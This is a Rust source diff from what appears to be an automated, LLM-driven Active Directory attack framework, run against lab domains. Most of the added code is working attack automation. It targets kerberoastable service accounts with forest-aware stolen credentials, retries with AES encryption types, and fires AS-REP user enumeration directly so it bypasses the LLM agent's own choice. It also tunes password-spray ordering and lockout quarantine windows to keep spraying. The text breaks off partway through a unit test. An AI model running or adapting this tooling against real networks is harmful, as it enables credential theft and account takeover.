@@ -15,6 +15,90 @@ fn kerberoast_dedup_key(domain: &str, username: &str) -> String {
     format!("krb:{}:{}", domain.to_lowercase(), username.to_lowercase())
 }
 
+/// AD default account-lockout duration, in seconds (~30 min). Used in place of
+/// the generic 5-min `quarantine_principal` window when a SPN-bearing service
+/// account trips `STATUS_ACCOUNT_LOCKED_OUT` during password_spray: cycling
+/// 5-min quarantines doesn't outlast the actual AD lockout, so the spray loop
+/// re-hammers the same locked principal across neighbouring domains until the
+/// real lockout policy unlocks it. Bug E.
+pub(crate) const SPN_LOCKOUT_QUARANTINE_SECS: i64 = 1800;
+
+/// Returns true when `username@domain` is a known SPN-bearing service account
+/// (either tagged by `kerberoastable_account`/`kerberoastable` vulnerabilities
+/// or holding a captured `kerberoast` hash). Used by the lockout handler to
+/// flip to the longer ≥30-min quarantine window so the spray loop doesn't
+/// re-trip the AD lockout policy on every 5-min tick.
+pub(crate) fn is_kerberoastable_principal(
+    state: &StateInner,
+    username: &str,
+    domain: &str,
+) -> bool {
+    let user_l = username.to_lowercase();
+    let dom_l = domain.to_lowercase();
+    // Vuln-driven evidence — discovered_vulnerabilities entries with
+    // vuln_type=kerberoastable / kerberoastable_account and a matching
+    // account_name + domain.
+    for vuln in state.discovered_vulnerabilities.values() {
+        let vt = vuln.vuln_type.to_lowercase();
+        if vt != "kerberoastable" && vt != "kerberoastable_account" {
+            continue;
+        }
+        let acct = vuln
+            .details
+            .get("account_name")
+            .or_else(|| vuln.details.get("username"))
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_lowercase();
+        let dom = vuln
+            .details
+            .get("domain")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .to_lowercase();
+        if acct == user_l && (dom.is_empty() || dom == dom_l) {
+            return true;
+        }
+    }
+    // Hash-driven evidence — we already captured a $krb5tgs$ hash for this
+    // principal, so the account demonstrably has an SPN.
+    state.hashes.iter().any(|h| {
+        h.hash_type.to_lowercase().contains("kerberoast")
+            && h.username.to_lowercase() == user_l
+            && h.domain.to_lowercase() == dom_l
+    })
+}
+
+/// Build the payload for an AES-only kerberoast retry after the KDC rejected
+/// the default-etype TGS-REQ with `KDC_ERR_ETYPE_NOSUPP`. Same shape as
+/// `request_credential_access`'s kerberoast payload plus an `etype_hint`
+/// field so the worker / tool wrapper requests AES256/AES128 etypes (msDS-
+/// SupportedEncryptionTypes is AES-only on the target service account).
+/// Bug E.
+pub(crate) fn build_aes_kerberoast_retry_payload(
+    domain: &str,
+    dc_ip: &str,
+    credential: &ares_core::models::Credential,
+    target_user: Option<&str>,
+) -> Value {
+    let mut payload = json!({
+        "technique": "kerberoast",
+        "target_ip": dc_ip,
+        "domain": domain,
+        "credential": {
+            "username": credential.username,
+            "password": credential.password,
+            "domain": credential.domain,
+        },
+        "etype_hint": ["aes256-cts-hmac-sha1-96", "aes128-cts-hmac-sha1-96"],
+        "retry_reason": "kdc_err_etype_nosupp",
+    });
+    if let Some(target) = target_user {
+        payload["target_user"] = json!(target);
+    }
+    payload
+}
+
 /// Build username spray dedup key from domain and username.
 fn spray_dedup_key(domain: &str, username: &str) -> String {
     format!("{}:{}", domain.to_lowercase(), username.to_lowercase())
@@ -60,6 +144,34 @@ fn is_host_domain_related(host_domain: &str, cred_domain: &str) -> bool {
     h == c || h.ends_with(&format!(".{c}")) || c.ends_with(&format!(".{h}"))
 }
 
+/// AS-REP roast dedup key for `domain`, keyed on whether a real userlist is
+/// known yet (`:users`) or not (`:empty`).
+///
+/// Centralised so the dispatcher ([`select_asrep_work`]), the spray
+/// prerequisite gate ([`common_spray_prereqs_met`]), and the user-publish
+/// re-arm (`publish_user`) all agree on the exact string. A past drift — the
+/// re-arm cleared the bare `{domain}` while the dispatcher marked
+/// `{domain}:users` — silently broke re-arming, so a foreign-forest roastable
+/// account discovered *after* the first userlist roast (e.g. found late via
+/// cross-forest LDAP) never triggered a second pass and its AS-REP hash was
+/// never captured.
+pub(crate) fn asrep_dedup_key(domain: &str, has_users: bool) -> String {
+    format!(
+        "{}:{}",
+        domain.to_lowercase(),
+        if has_users { "users" } else { "empty" }
+    )
+}
+
+/// Both AS-REP dedup key variants for `domain` — used to re-arm the roast on
+/// new-user discovery regardless of which variant was last dispatched.
+pub(crate) fn asrep_dedup_keys(domain: &str) -> [String; 2] {
+    [
+        asrep_dedup_key(domain, false),
+        asrep_dedup_key(domain, true),
+    ]
+}
+
 /// One unit of AS-REP roast work: `(domain, dc_ip, dedup_key)`. Re-armable on
 /// the `:empty`/`:users` transition so a freshly-enumerated foreign-forest
 /// userlist triggers a second pass.
@@ -82,7 +194,7 @@ pub(crate) fn select_asrep_work(state: &StateInner) -> Vec<AsrepWorkItem> {
                     && !u.username.is_empty()
                     && !u.username.ends_with('$')
             });
-            let dedup_key = format!("{}:{}", dom_l, if has_users { "users" } else { "empty" });
+            let dedup_key = asrep_dedup_key(domain, has_users);
             if state.is_processed(DEDUP_ASREP_DOMAINS, &dedup_key) {
                 return None;
             }
@@ -178,6 +290,163 @@ pub(crate) fn build_asrep_payload(
 /// the kerberoast dispatch loop consumes.
 pub(crate) type KerberoastWorkItem = (String, String, String, ares_core::models::Credential);
 
+/// Vuln-driven kerberoast work item: a `kerberoastable_account` /
+/// `kerberoastable` vulnerability paired with a forest-aware credential and
+/// the DC to TGS-REQ against. The existing [`KerberoastWorkItem`] loop walks
+/// `state.credentials` and dispatches once per cred — so a vuln whose target
+/// domain we hold *no* same-realm cred for is never read, and the SPN
+/// account never gets a deterministic TGS-REQ. This work item closes that
+/// gap by walking the vuln set directly (Bug 1).
+pub(crate) struct VulnKerberoastWorkItem {
+    pub vuln_id: String,
+    pub dedup_key: String,
+    pub dc_ip: String,
+    pub target_domain: String,
+    pub target_user: String,
+    pub credential: ares_core::models::Credential,
+}
+
+/// Return true when `a` and `b` are in the same AD forest (intra-forest
+/// parent-child relationship), case-insensitively. Forest is defined by
+/// shared root domain. Empty inputs are treated as "unknown" and match only
+/// another empty string. Mirrors the helper in `ntlm_relay.rs` /
+/// `credential_reuse.rs` — inlined here for the same reason (cross-module
+/// dep on a three-line predicate isn't worth it).
+fn same_forest_domain(a: &str, b: &str) -> bool {
+    let a = a.to_lowercase();
+    let b = b.to_lowercase();
+    if a.is_empty() || b.is_empty() {
+        return a == b;
+    }
+    a == b || a.ends_with(&format!(".{b}")) || b.ends_with(&format!(".{a}"))
+}
+
+/// Pick a credential suitable for an authenticated TGS-REQ against
+/// `target_domain`. Same-domain wins; same-forest (parent or child realm)
+/// is acceptable because cross-realm referrals are transparent inside a
+/// forest. Cross-forest creds are NOT acceptable — the target DC rejects
+/// the foreign-realm principal without an inter-realm referral ticket.
+/// Skips quarantined principals and delegation accounts (those have their
+/// own dispatch paths).
+fn pick_kerberoast_credential(
+    state: &StateInner,
+    target_domain: &str,
+) -> Option<ares_core::models::Credential> {
+    let dom_l = target_domain.to_lowercase();
+    if let Some(c) = state.credentials.iter().find(|c| {
+        !c.password.is_empty()
+            && c.domain.to_lowercase() == dom_l
+            && !state.is_delegation_account(&c.username)
+            && !state.is_principal_quarantined(&c.username, &c.domain)
+    }) {
+        return Some(c.clone());
+    }
+    state
+        .credentials
+        .iter()
+        .find(|c| {
+            !c.password.is_empty()
+                && same_forest_domain(&c.domain, target_domain)
+                && !state.is_delegation_account(&c.username)
+                && !state.is_principal_quarantined(&c.username, &c.domain)
+        })
+        .cloned()
+}
+
+/// Select vuln-driven kerberoast work items for this tick. Walks
+/// `state.discovered_vulnerabilities` for `kerberoastable_account` /
+/// `kerberoastable` entries, resolves a DC IP for the vuln's target
+/// domain, and pairs each with a forest-aware credential.
+///
+/// Dedup key (`krb_vuln:{vuln_id}`) is intentionally distinct from the
+/// existing cred-driven `kerberoast_dedup_key` ("krb:{domain}:{user}") so a
+/// successful cred-driven dispatch doesn't suppress the vuln-driven retry
+/// when the cred-driven attempt was made against the wrong realm (the
+/// scenario from old-doc Bug 1: `ntlm:child.contoso.local:sql_svc`
+/// dispatched against the fabrikam.local DC).
+///
+/// Skips:
+///   - Vulns already in `exploited_vulnerabilities`
+///   - Vulns whose dedup key is in `DEDUP_CRACK_REQUESTS` (vuln already
+///     dispatched once)
+///   - Vulns with no resolvable DC for the target domain
+///   - Vulns with no forest-aware cred (silent-drop warn fires in the
+///     dispatch loop so the next op's triage is visible)
+///
+/// Caps at `max_items` to keep parity with [`select_kerberoast_work`].
+pub(crate) fn select_kerberoast_vuln_work(
+    state: &StateInner,
+    max_items: usize,
+) -> Vec<VulnKerberoastWorkItem> {
+    state
+        .discovered_vulnerabilities
+        .values()
+        .filter_map(|vuln| {
+            let vt = vuln.vuln_type.to_lowercase();
+            if vt != "kerberoastable" && vt != "kerberoastable_account" {
+                return None;
+            }
+            if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
+                return None;
+            }
+            let target_user = vuln
+                .details
+                .get("account_name")
+                .or_else(|| vuln.details.get("username"))
+                .and_then(|v| v.as_str())
+                .filter(|s| !s.is_empty())?
+                .to_string();
+            let target_domain = vuln
+                .details
+                .get("domain")
+                .and_then(|v| v.as_str())
+                .filter(|s| !s.is_empty())?
+                .to_string();
+            let dedup_key = format!("krb_vuln:{}", vuln.vuln_id);
+            if state.is_processed(DEDUP_CRACK_REQUESTS, &dedup_key) {
+                return None;
+            }
+            let (dc_ip, _resolved) = resolve_kerberoast_dc(state, &target_domain)?;
+            let credential = pick_kerberoast_credential(state, &target_domain)?;
+            Some(VulnKerberoastWorkItem {
+                vuln_id: vuln.vuln_id.clone(),
+                dedup_key,
+                dc_ip,
+                target_domain,
+                target_user,
+                credential,
+            })
+        })
+        .take(max_items)
+        .collect()
+}
+
+/// Build a kerberoast payload narrowed to a single SPN account via
+/// `target_user`. The default kerberoast dispatch (`request_credential_access`)
+/// doesn't include `target_user`, so the worker enumerates all SPN accounts
+/// on the DC. When the dispatch is vuln-driven we already know the account
+/// to roast; passing `target_user` lets `targeted_kerberoast.py` request just
+/// that account's TGS without scanning the full SPN set.
+pub(crate) fn build_vuln_kerberoast_payload(
+    target_domain: &str,
+    dc_ip: &str,
+    credential: &ares_core::models::Credential,
+    target_user: &str,
+) -> Value {
+    json!({
+        "technique": "kerberoast",
+        "target_ip": dc_ip,
+        "domain": target_domain,
+        "target_user": target_user,
+        "credential": {
+            "username": credential.username,
+            "password": credential.password,
+            "domain": credential.domain,
+        },
+        "reason": "kerberoastable_account_vuln",
+    })
+}
+
 /// Resolve a DC IP for a Kerberoast attempt against `cred_domain`. Tries
 /// exact match in `domain_controllers`, then child-domain DCs (`d.ends_with(".{cred_domain}")`),
 /// then the first `target_ips` entry. Returns `(dc_ip, resolved_domain)` —
@@ -209,11 +478,12 @@ pub(crate) fn select_kerberoast_work(
     state: &StateInner,
     max_items: usize,
 ) -> Vec<KerberoastWorkItem> {
+    let delegation = state.delegation_account_names();
     state
         .credentials
         .iter()
         .filter(|c| !c.domain.is_empty())
-        .filter(|c| !state.is_delegation_account(&c.username))
+        .filter(|c| !delegation.contains(&c.username.to_lowercase()))
         .filter(|c| !state.is_principal_quarantined(&c.username, &c.domain))
         .filter_map(|cred| {
             let cred_domain = cred.domain.to_lowercase();
@@ -239,12 +509,14 @@ pub(crate) fn select_username_spray_work(
     state: &StateInner,
     max_items: usize,
 ) -> Vec<SprayWorkItem> {
+    let delegation = state.delegation_account_names();
     state
         .users
         .iter()
         .filter(|u| !u.domain.is_empty())
+        .filter(|u| !u.username.ends_with('$'))
         .filter(|u| !ares_core::models::is_always_disabled_account(&u.username))
-        .filter(|u| !state.is_delegation_account(&u.username))
+        .filter(|u| !delegation.contains(&u.username.to_lowercase()))
         .filter(|u| !state.is_principal_quarantined(&u.username, &u.domain))
         .filter_map(|u| {
             let user_domain = u.domain.to_lowercase();
@@ -280,11 +552,12 @@ pub(crate) fn select_low_hanging_work(
     state: &StateInner,
     max_items: usize,
 ) -> Vec<LowHangingWorkItem> {
+    let delegation = state.delegation_account_names();
     state
         .credentials
         .iter()
         .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
-        .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
+        .filter(|c| c.is_admin || !delegation.contains(&c.username.to_lowercase()))
         .filter(|c| !state.is_principal_quarantined(&c.username, &c.domain))
         .filter_map(|cred| {
             let cred_domain = cred.domain.to_lowercase();
@@ -325,11 +598,12 @@ pub(crate) fn select_credential_secretsdump_work(
     max_items: usize,
 ) -> Vec<SdWorkItem> {
     let mut items = Vec::new();
+    let delegation = state.delegation_account_names();
     for cred in state
         .credentials
         .iter()
         .filter(|c| !c.domain.is_empty() && !c.password.is_empty())
-        .filter(|c| c.is_admin || !state.is_delegation_account(&c.username))
+        .filter(|c| c.is_admin || !delegation.contains(&c.username.to_lowercase()))
         .filter(|c| !state.is_principal_quarantined(&c.username, &c.domain))
     {
         let cred_domain = cred.domain.to_lowercase();
@@ -368,8 +642,7 @@ pub(crate) fn select_credential_secretsdump_work(
 /// can be tested independently of the outer dispatcher loop.
 pub(crate) fn common_spray_prereqs_met(state: &StateInner, domain: &str) -> bool {
     let d = domain.to_lowercase();
-    let empty_key = format!("{d}:empty");
-    let users_key = format!("{d}:users");
+    let [empty_key, users_key] = asrep_dedup_keys(domain);
     let asrep_done = state.is_processed(DEDUP_ASREP_DOMAINS, &empty_key)
         || state.is_processed(DEDUP_ASREP_DOMAINS, &users_key);
     if !asrep_done {
@@ -424,7 +697,7 @@ pub(crate) fn build_common_spray_payload(
     excluded_users: &[String],
 ) -> Value {
     json!({
-        "techniques": ["password_spray", "username_as_password"],
+        "techniques": ["username_as_password", "password_spray"],
         "reason": "low_hanging_fruit",
         "target_ip": dc_ip,
         "domain": domain,
@@ -577,6 +850,68 @@ pub async fn auto_credential_access(
                         }
                     }
                 });
+            } else {
+                // Cold-start: no userlist for this domain yet. The LLM submit
+                // above gets the cold-start instructions but the
+                // credential_access agent consistently picks `password_spray`
+                // over `kerberos_user_enum_noauth` — leaving the only
+                // zero-cred foothold path for a SID-filtered foreign forest
+                // unexercised (verified in op-20260629-220147: 0 essos
+                // accounts discovered until a DA cred was manually injected).
+                // Fire GetNPUsers against the seclists wordlist directly.
+                // Any AS-REP hash that comes back lands in state.hashes via
+                // push_realtime_discoveries; the user-backfill in publish_hash
+                // populates state.users, and the next tick re-arms this
+                // domain's dedup as `:users` so the warm-path branch above
+                // re-runs GetNPUsers against the discovered list.
+                let det_args = json!({
+                    "domain": domain,
+                    "dc_ip": dc_ip,
+                });
+                let det_call = ares_llm::ToolCall {
+                    id: format!("asrep_enum_{}", uuid::Uuid::new_v4().simple()),
+                    name: "kerberos_user_enum_noauth".to_string(),
+                    arguments: det_args,
+                };
+                let det_task_id = format!(
+                    "asrep_enum_{}",
+                    &uuid::Uuid::new_v4().simple().to_string()[..12]
+                );
+                info!(
+                    task_id = %det_task_id,
+                    domain = %domain,
+                    dc_ip = %dc_ip,
+                    "Cold-start AS-REP user enum dispatched (direct tool, no LLM)"
+                );
+                let dispatcher_bg = dispatcher.clone();
+                let domain_bg = domain.clone();
+                tokio::spawn(async move {
+                    match dispatcher_bg
+                        .llm_runner
+                        .tool_dispatcher()
+                        .dispatch_tool("credential_access", &det_task_id, &det_call)
+                        .await
+                    {
+                        Ok(result) => {
+                            let hash_count = result
+                                .discoveries
+                                .as_ref()
+                                .and_then(|d| d.get("hashes"))
+                                .and_then(|h| h.as_array())
+                                .map(|a| a.len())
+                                .unwrap_or(0);
+                            info!(
+                                task_id = %det_task_id,
+                                domain = %domain_bg,
+                                hash_count,
+                                "Cold-start AS-REP user enum completed"
+                            );
+                        }
+                        Err(e) => {
+                            warn!(err = %e, domain = %domain_bg, "Cold-start AS-REP user enum failed");
+                        }
+                    }
+                });
             }
         }
 
@@ -613,6 +948,93 @@ pub async fn auto_credential_access(
                 }
                 Ok(None) => {}
                 Err(e) => warn!(err = %e, "Failed to dispatch kerberoast"),
+            }
+        }
+
+        // Bug 1: vuln-driven kerberoast. The cred-driven loop above iterates
+        // `state.credentials` and dispatches once per `(domain, username)` —
+        // a `kerberoastable_account` vuln whose target domain has no
+        // same-realm cred is never read. This second loop walks the vuln
+        // set directly and pairs each entry with a forest-aware cred so
+        // SID-filtered foreign-forest SPN accounts (e.g. `sql_svc@fabrikam.local`
+        // when only `contoso.local` creds are held) get a deterministic
+        // TGS-REQ.
+        let vuln_kerberoast_work: Vec<VulnKerberoastWorkItem> =
+            if !dispatcher.is_technique_allowed("kerberoast") {
+                Vec::new()
+            } else {
+                let state = dispatcher.state.read().await;
+                let max = if dispatcher.config.strategy.is_comprehensive() {
+                    10
+                } else {
+                    2
+                };
+                select_kerberoast_vuln_work(&state, max)
+            };
+
+        // Surface the silent-drop case (vuln but no forest cred) once per
+        // tick so the next op's triage doesn't need to grep
+        // discovered_vulns against dispatch traces.
+        if vuln_kerberoast_work.is_empty() {
+            let unmet = {
+                let state = dispatcher.state.read().await;
+                state
+                    .discovered_vulnerabilities
+                    .values()
+                    .filter(|v| {
+                        let vt = v.vuln_type.to_lowercase();
+                        (vt == "kerberoastable" || vt == "kerberoastable_account")
+                            && !state.exploited_vulnerabilities.contains(&v.vuln_id)
+                            && !state.is_processed(
+                                DEDUP_CRACK_REQUESTS,
+                                &format!("krb_vuln:{}", v.vuln_id),
+                            )
+                    })
+                    .count()
+            };
+            if unmet > 0 {
+                debug!(
+                    unmet_vulns = unmet,
+                    "Vuln-driven kerberoast: pending vulns have no forest-aware cred (Bug 1 visibility)"
+                );
+            }
+        }
+
+        for item in vuln_kerberoast_work {
+            let payload = build_vuln_kerberoast_payload(
+                &item.target_domain,
+                &item.dc_ip,
+                &item.credential,
+                &item.target_user,
+            );
+            let priority = dispatcher.effective_priority("kerberoast");
+            match dispatcher
+                .throttled_submit("credential_access", "credential_access", payload, priority)
+                .await
+            {
+                Ok(Some(task_id)) => {
+                    info!(
+                        task_id = %task_id,
+                        vuln_id = %item.vuln_id,
+                        target_user = %item.target_user,
+                        target_domain = %item.target_domain,
+                        cred_domain = %item.credential.domain,
+                        "Vuln-driven kerberoast dispatched"
+                    );
+                    dispatcher
+                        .state
+                        .write()
+                        .await
+                        .mark_processed(DEDUP_CRACK_REQUESTS, item.dedup_key.clone());
+                    let _ = dispatcher
+                        .state
+                        .persist_dedup(&dispatcher.queue, DEDUP_CRACK_REQUESTS, &item.dedup_key)
+                        .await;
+                }
+                Ok(None) => {}
+                Err(e) => {
+                    warn!(err = %e, vuln_id = %item.vuln_id, "Failed to dispatch vuln-driven kerberoast")
+                }
             }
         }
 
@@ -816,7 +1238,41 @@ pub async fn auto_credential_access(
 mod tests {
     use super::*;
 
-    // --- kerberoast_dedup_key ---
+    #[test]
+    fn asrep_dedup_key_is_lowercased_and_suffixed() {
+        assert_eq!(
+            asrep_dedup_key("CONTOSO.LOCAL", false),
+            "contoso.local:empty"
+        );
+        assert_eq!(
+            asrep_dedup_key("contoso.local", true),
+            "contoso.local:users"
+        );
+    }
+
+    #[test]
+    fn asrep_rearm_keys_cover_both_dispatch_variants() {
+        // The user-publish re-arm clears `asrep_dedup_keys(domain)`; the
+        // dispatcher (`select_asrep_work`) marks `asrep_dedup_key(domain,
+        // has_users)`. If these ever drift, a roastable account discovered
+        // AFTER the first userlist roast never re-triggers a roast — the bug
+        // that left a late-discovered foreign-forest account un-roasted and
+        // the second forest without a foothold. Lock the exact strings so the
+        // publisher and the dispatcher can never disagree again.
+        let dispatched_empty = asrep_dedup_key("contoso.local", false);
+        let dispatched_users = asrep_dedup_key("contoso.local", true);
+        // Re-arm is case-insensitive (user.domain may differ in case from the
+        // state.domains entry) and must cover BOTH variants.
+        let rearm = asrep_dedup_keys("CONTOSO.LOCAL");
+        assert!(
+            rearm.contains(&dispatched_empty),
+            "re-arm must clear the :empty key the dispatcher marks"
+        );
+        assert!(
+            rearm.contains(&dispatched_users),
+            "re-arm must clear the :users key the dispatcher marks"
+        );
+    }
 
     #[test]
     fn kerberoast_dedup_key_basic() {
@@ -839,8 +1295,6 @@ mod tests {
         assert_eq!(kerberoast_dedup_key("", ""), "krb::");
     }
 
-    // --- spray_dedup_key ---
-
     #[test]
     fn spray_dedup_key_basic() {
         assert_eq!(
@@ -859,8 +1313,6 @@ mod tests {
         assert_eq!(spray_dedup_key("", ""), ":");
     }
 
-    // --- common_spray_dedup_key ---
-
     #[test]
     fn common_spray_dedup_key_basic() {
         assert_eq!(
@@ -874,8 +1326,6 @@ mod tests {
         assert_eq!(common_spray_dedup_key(""), "common:");
     }
 
-    // --- low_hanging_dedup_key ---
-
     #[test]
     fn low_hanging_dedup_key_basic() {
         assert_eq!(
@@ -888,8 +1338,6 @@ mod tests {
     fn low_hanging_dedup_key_empty() {
         assert_eq!(low_hanging_dedup_key("", ""), ":");
     }
-
-    // --- credential_secretsdump_dedup_key ---
 
     #[test]
     fn credential_secretsdump_dedup_key_basic() {
@@ -912,8 +1360,6 @@ mod tests {
     fn credential_secretsdump_dedup_key_empty() {
         assert_eq!(credential_secretsdump_dedup_key("", "", ""), "::");
     }
-
-    // --- resolve_host_domain_from_fqdn ---
 
     #[test]
     fn resolve_host_domain_from_fqdn_typical() {
@@ -948,8 +1394,6 @@ mod tests {
     fn resolve_host_domain_from_fqdn_empty() {
         assert_eq!(resolve_host_domain_from_fqdn(""), "");
     }
-
-    // --- is_host_domain_related ---
 
     #[test]
     fn is_host_domain_related_same_domain() {
@@ -997,7 +1441,7 @@ mod tests {
         assert!(!is_host_domain_related("", ""));
     }
 
-    // ── helpers for select/build tests ─────────────────────────────────
+    // helpers for select/build tests
 
     fn make_cred(user: &str, password: &str, domain: &str) -> ares_core::models::Credential {
         ares_core::models::Credential {
@@ -1026,6 +1470,7 @@ mod tests {
             description: String::new(),
             is_admin: false,
             source: String::new(),
+            member_of: Vec::new(),
         }
     }
 
@@ -1060,8 +1505,6 @@ mod tests {
             trust_pair_label: None,
         }
     }
-
-    // --- select_asrep_work ----------------------------------------------
 
     #[test]
     fn select_asrep_emits_empty_key_when_no_users() {
@@ -1118,8 +1561,6 @@ mod tests {
         assert!(select_asrep_work(&s).is_empty());
     }
 
-    // --- collect_known_users_for_domain ---------------------------------
-
     #[test]
     fn collect_known_users_filters_machine_accounts() {
         let mut s = StateInner::new("op".into());
@@ -1150,8 +1591,6 @@ mod tests {
         );
     }
 
-    // --- build_asrep_payload -------------------------------------------
-
     #[test]
     fn build_asrep_cold_start_payload() {
         let p = build_asrep_payload("contoso.local", "192.168.58.10", &[], &[]);
@@ -1179,8 +1618,6 @@ mod tests {
         let instr = p["instructions"].as_str().unwrap();
         assert!(instr.contains("usernames already discovered"));
     }
-
-    // --- resolve_kerberoast_dc -----------------------------------------
 
     #[test]
     fn resolve_kerberoast_dc_exact_match() {
@@ -1217,8 +1654,6 @@ mod tests {
         let s = StateInner::new("op".into());
         assert!(resolve_kerberoast_dc(&s, "contoso.local").is_none());
     }
-
-    // --- select_kerberoast_work ----------------------------------------
 
     #[test]
     fn select_kerberoast_skips_quarantined() {
@@ -1257,8 +1692,6 @@ mod tests {
         assert!(select_kerberoast_work(&s, 10).is_empty());
     }
 
-    // --- select_username_spray_work ------------------------------------
-
     #[test]
     fn select_spray_skips_disabled_built_in_accounts() {
         let mut s = StateInner::new("op".into());
@@ -1269,6 +1702,18 @@ mod tests {
         s.users.push(make_user("alice", "contoso.local"));
         let work = select_username_spray_work(&s, 10);
         // Only alice survives.
+        assert_eq!(work.len(), 1);
+        assert!(work[0].0.contains(":alice"));
+    }
+
+    #[test]
+    fn select_spray_skips_machine_accounts() {
+        let mut s = StateInner::new("op".into());
+        s.domain_controllers
+            .insert("contoso.local".into(), "192.168.58.10".into());
+        s.users.push(make_user("CA01$", "contoso.local"));
+        s.users.push(make_user("alice", "contoso.local"));
+        let work = select_username_spray_work(&s, 10);
         assert_eq!(work.len(), 1);
         assert!(work[0].0.contains(":alice"));
     }
@@ -1294,8 +1739,6 @@ mod tests {
         }
         assert_eq!(select_username_spray_work(&s, 3).len(), 3);
     }
-
-    // --- select_low_hanging_work ---------------------------------------
 
     #[test]
     fn select_low_hanging_skips_empty_password() {
@@ -1328,8 +1771,6 @@ mod tests {
 
         assert!(select_low_hanging_work(&s, 10).is_empty());
     }
-
-    // --- select_credential_secretsdump_work ----------------------------
 
     #[test]
     fn select_sd_keeps_same_domain_host_cred_pairs() {
@@ -1395,8 +1836,6 @@ mod tests {
         assert_eq!(select_credential_secretsdump_work(&s, 10).len(), 1);
     }
 
-    // --- common_spray_prereqs_met --------------------------------------
-
     #[test]
     fn common_spray_prereqs_fail_without_asrep() {
         let s = StateInner::new("op".into());
@@ -1446,8 +1885,6 @@ mod tests {
         assert!(common_spray_prereqs_met(&s, "contoso.local"));
     }
 
-    // --- select_common_spray_work --------------------------------------
-
     #[test]
     fn select_common_spray_emits_when_prereqs_met() {
         let mut s = StateInner::new("op".into());
@@ -1476,8 +1913,6 @@ mod tests {
         assert!(select_common_spray_work(&s).is_empty());
     }
 
-    // --- payload builders -----------------------------------------------
-
     #[test]
     fn build_spray_payload_fields() {
         let p = build_username_spray_payload(
@@ -1495,11 +1930,206 @@ mod tests {
     fn build_common_spray_payload_fields() {
         let p =
             build_common_spray_payload("192.168.58.10", "contoso.local", &["locked.user".into()]);
-        assert_eq!(p["techniques"][0], "password_spray");
-        assert_eq!(p["techniques"][1], "username_as_password");
+        assert_eq!(p["techniques"][0], "username_as_password");
+        assert_eq!(p["techniques"][1], "password_spray");
         assert_eq!(p["reason"], "low_hanging_fruit");
         assert_eq!(p["use_common_passwords"], true);
         assert_eq!(p["acknowledge_no_policy"], true);
         assert_eq!(p["excluded_users"], "locked.user");
+    }
+
+    // Bug 1: vuln-driven kerberoast dispatcher
+
+    fn make_kerberoastable_vuln(
+        vuln_id: &str,
+        account_name: &str,
+        domain: &str,
+    ) -> ares_core::models::VulnerabilityInfo {
+        let mut details = std::collections::HashMap::new();
+        details.insert("account_name".into(), json!(account_name));
+        details.insert("domain".into(), json!(domain));
+        ares_core::models::VulnerabilityInfo {
+            vuln_id: vuln_id.to_string(),
+            vuln_type: "kerberoastable_account".into(),
+            target: "".into(),
+            discovered_by: "test".into(),
+            discovered_at: chrono::Utc::now(),
+            details,
+            recommended_agent: "credential_access".into(),
+            priority: 99,
+        }
+    }
+
+    #[test]
+    fn same_forest_domain_helper_matches_intra_forest() {
+        assert!(same_forest_domain("contoso.local", "contoso.local"));
+        assert!(same_forest_domain("CHILD.contoso.local", "contoso.local"));
+        assert!(same_forest_domain("contoso.local", "child.contoso.local"));
+        assert!(!same_forest_domain("contoso.local", "fabrikam.local"));
+        assert!(!same_forest_domain("", "contoso.local"));
+        assert!(same_forest_domain("", ""));
+    }
+
+    #[test]
+    fn pick_kerberoast_credential_prefers_same_realm() {
+        let mut s = StateInner::new("op-test".into());
+        s.credentials
+            .push(make_cred("alice", "Pw!", "fabrikam.local"));
+        s.credentials.push(make_cred("bob", "Pw!", "contoso.local"));
+        let c = pick_kerberoast_credential(&s, "fabrikam.local").expect("cred");
+        assert_eq!(c.username, "alice");
+    }
+
+    #[test]
+    fn pick_kerberoast_credential_falls_back_to_same_forest() {
+        // No exact-domain cred for child.contoso.local — the parent-realm
+        // cred should still be picked (cross-realm referrals are
+        // transparent inside the forest).
+        let mut s = StateInner::new("op-test".into());
+        s.credentials
+            .push(make_cred("alice", "Pw!", "contoso.local"));
+        let c = pick_kerberoast_credential(&s, "child.contoso.local").expect("cred");
+        assert_eq!(c.username, "alice");
+    }
+
+    #[test]
+    fn pick_kerberoast_credential_rejects_cross_forest() {
+        let mut s = StateInner::new("op-test".into());
+        s.credentials
+            .push(make_cred("carol", "P@ssw0rd!", "contoso.local"));
+        assert!(pick_kerberoast_credential(&s, "fabrikam.local").is_none());
+    }
+
+    #[test]
+    fn pick_kerberoast_credential_skips_quarantined() {
+        let mut s = StateInner::new("op-test".into());
+        s.credentials
+            .push(make_cred("carol", "P@ssw0rd!", "fabrikam.local"));
+        s.quarantine_principal("carol", "fabrikam.local");
+        assert!(pick_kerberoast_credential(&s, "fabrikam.local").is_none());
+    }
+
+    #[test]
+    fn select_kerberoast_vuln_emits_dispatch_when_forest_cred_exists() {
+        // Vuln on sql_svc@fabrikam.local, only cred is on fabrikam.local — the
+        // existing cred-driven loop would also catch this, but the
+        // dedup key here is distinct so both can fire if needed.
+        let mut s = StateInner::new("op-test".into());
+        s.discovered_vulnerabilities.insert(
+            "v-spn-fabrikam".into(),
+            make_kerberoastable_vuln("v-spn-fabrikam", "sql_svc", "fabrikam.local"),
+        );
+        s.domain_controllers
+            .insert("fabrikam.local".into(), "192.168.58.20".into());
+        s.credentials
+            .push(make_cred("carol", "P@ssw0rd!", "fabrikam.local"));
+        let work = select_kerberoast_vuln_work(&s, 10);
+        assert_eq!(work.len(), 1);
+        assert_eq!(work[0].vuln_id, "v-spn-fabrikam");
+        assert_eq!(work[0].target_user, "sql_svc");
+        assert_eq!(work[0].target_domain, "fabrikam.local");
+        assert_eq!(work[0].dc_ip, "192.168.58.20");
+        assert_eq!(work[0].credential.username, "carol");
+        assert_eq!(work[0].dedup_key, "krb_vuln:v-spn-fabrikam");
+    }
+
+    #[test]
+    fn select_kerberoast_vuln_uses_parent_realm_cred_for_child_target() {
+        // Vuln on child.contoso.local, only cred is for parent. The cred-
+        // driven loop would dispatch against contoso.local (the cred's
+        // domain), missing the child SPN entirely. This loop catches the
+        // child-domain case.
+        let mut s = StateInner::new("op-test".into());
+        s.discovered_vulnerabilities.insert(
+            "v-spn-child".into(),
+            make_kerberoastable_vuln("v-spn-child", "svc_sql", "child.contoso.local"),
+        );
+        s.domain_controllers
+            .insert("child.contoso.local".into(), "192.168.58.10".into());
+        s.credentials
